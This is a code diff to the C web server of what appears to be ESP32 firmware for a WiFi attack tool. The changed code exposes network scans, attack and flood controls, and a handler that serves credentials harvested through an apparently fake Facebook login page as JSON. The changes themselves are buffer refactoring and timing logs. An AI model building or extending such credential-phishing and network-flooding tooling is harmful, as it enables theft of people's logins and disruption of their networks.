@@ -8,7 +8,9 @@
 #include "tasks.h"
 #include "facebook_web_server.h"
 
-static wifictl_ap_records_t ap_records = {0};
+//                                   SSID + BSSID + json formating
+#define JSON_BUFFER_SIZE (MAX_APS * (32 + 17 + 31))
+ wifictl_ap_records_t ap_records = {0};
 
 void handle_scan(int client_sock) {
     int err = scan_networks(&ap_records);
@@ -17,9 +19,14 @@ void handle_scan(int client_sock) {
         http_send_error_response(client_sock);
         return;
     }
-    char* records = records_to_json(&ap_records);
-    http_send_json_response(client_sock, records);
-    free(records);
+    char json[JSON_BUFFER_SIZE] = {0};
+    int records_parsed = records_to_json(&ap_records, json, JSON_BUFFER_SIZE);
+    if(records_parsed != 0) {
+        ESP_LOGE("WebServer", "Failed to convert records to JSON");
+        http_send_error_response(client_sock);
+        return;
+    }
+    http_send_json_response(client_sock, json);
 }
 
 void handle_attack(http_request_t* req, int client_sock) {
@@ -87,17 +94,16 @@ void handle_flood_stop(http_request_t* req, int client_sock) {
     http_send_ok_response(client_sock); // 200
 }
 
+char json[MAX_CRED_ENDTRIES_JSON] = {0};
 void handle_facebook_data(http_request_t* req, int client_sock) {
-    print_cred_buffer(&cred_buffer);
-    char* json = cred_buffer_to_json(&cred_buffer);
-    if (json == NULL) {
+    int res = cred_buffer_to_json(&cred_buffer, json, sizeof(json));
+    if (res == -1) {
         ESP_LOGE("WebServer", "Failed to convert credentials to JSON");
         http_send_error_response(client_sock);
         return;
     }
     printf("facebook json %s\n", json);
     http_send_json_response(client_sock, json);
-    free(json);
 }
 
 void handle_connection(http_request_t* req, int client_sock) {
@@ -107,6 +113,7 @@ void handle_connection(http_request_t* req, int client_sock) {
         return;
     }
 
+    int64_t start_time = esp_timer_get_time();
     if (strcmp(req->url, "/") == 0) {
         ESP_LOGI("WebServer", "Handling root request");
         http_send_html_response(client_sock, root_page_html);
@@ -129,6 +136,9 @@ void handle_connection(http_request_t* req, int client_sock) {
         ESP_LOGI("WebServer", "Handling not found request");
         http_send_not_found_response(client_sock);
     }
+    int64_t end_time = esp_timer_get_time();
+    int64_t durata = end_time - start_time;
+    printf("Ruta %s a durat %lld microsecunde\n", req->url, durata);
 }
 
 void start_webserver(){
